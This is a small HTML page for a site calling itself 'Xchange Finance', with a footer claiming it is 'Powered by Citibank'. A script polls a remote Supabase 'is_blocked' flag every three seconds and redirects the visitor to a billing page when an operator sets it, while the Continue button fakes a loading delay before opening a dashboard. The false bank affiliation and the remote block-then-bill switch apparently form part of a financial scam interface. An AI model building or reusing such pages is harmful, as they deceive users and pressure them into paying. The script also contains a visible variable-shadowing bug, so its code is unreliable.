<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Xchange Finance</title>
  <style>
    *{box-sizing:border-box}
    body{margin:0;font-family:Inter,system-ui,-apple-system,sans-serif;background:#f3f6fb;color:#14213d}
    .card{max-width:460px;margin:50px auto;background:white;border-radius:18px;padding:28px;box-shadow:0 12px 35px #0001}
    h1{margin-top:0}
    input{width:100%;padding:13px;margin:8px 0 15px;border:1px solid #ccd5e2;border-radius:10px}
    
    button,.btn{
      display:flex;
      align-items:center;
      justify-content:center;
      gap:10px;
      width:100%;
      padding:14px;
      border:0;
      border-radius:10px;
      background:#173b72;
      color:white;
      font-size:16px;
      font-weight:700;
      cursor:pointer;
      text-align:center;
      text-decoration:none;
      transition:opacity 0.2s;
    }
    button:disabled{
      opacity: 0.85;
      cursor: not-allowed;
    }

    /* CSS Spinner */
    .spinner {
      display: none;
      width: 18px;
      height: 18px;
      border: 3px solid rgba(255, 255, 255, 0.3);
      border-radius: 50%;
      border-top-color: white;
      animation: spin 0.8s linear infinite;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    .money{font-size:32px;font-weight:800;margin:15px 0}
    .muted{color:#65748b;line-height:1.55}
    .notice{padding:14px;border-radius:12px;background:#f4f7fb;margin:16px 0;line-height:1.55}
    .row{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid #e8edf4}
    .small{font-size:12px;color:#77859a}
    .top{margin-bottom:18px}
    .footer-powered {
      text-align: center;
      margin-top: 16px;
      font-size: 13px;
      color: #77859a;
      font-weight: 500;
    }
    @media(max-width:520px){.card{margin:20px 12px}}
  </style>

  <!-- Supabase Client Library -->
  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
</head>
<body>
  <main class="card">
    <h1>Welcome to Xchange Finance</h1>
    
    <button id="continueBtn" onclick="handleContinue()">
      <span class="spinner" id="spinner"></span>
      <span id="btnText">Continue</span>
    </button>

    <div class="footer-powered">Powered by Citibank</div>
  </main>

  <script>
    // 1. Initialize Supabase
    const SUPABASE_URL = 'https://rgtbqipsdebekzznswll.supabase.co';
    const SUPABASE_ANON_KEY = 'sb_publishable_QF5lXikZj0cRv1sipEFtyg_zqjw0eW1';
    const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

    // 2. Check if the block flag is active
    async function checkIsBlockedStatus() {
      try {
        const { data, error } = await supabase
          .from('user_status')
          .select('is_blocked')
          .limit(1)
          .single();

        if (data && data.is_blocked === true) {
          window.location.href = 'billing.html';
        }
      } catch (err) {
        console.error('Check status error:', err);
      }
    }

    // Check immediately on load and poll every 3 seconds
    checkIsBlockedStatus();
    setInterval(checkIsBlockedStatus, 3000);

    function handleContinue() {
      const btn = document.getElementById('continueBtn');
      const spinner = document.getElementById('spinner');
      const btnText = document.getElementById('btnText');

      // Disable button to prevent double clicks
      btn.disabled = true;
      
      // Show spinner and change text
      spinner.style.display = 'inline-block';
      btnText.textContent = 'Loading...';

      // Simulate loading delay (1.2 seconds) before redirecting
      setTimeout(() => {
        window.location.href = 'dashboard.html';
      }, 1200);
    }
  </script>
</body>
</html>
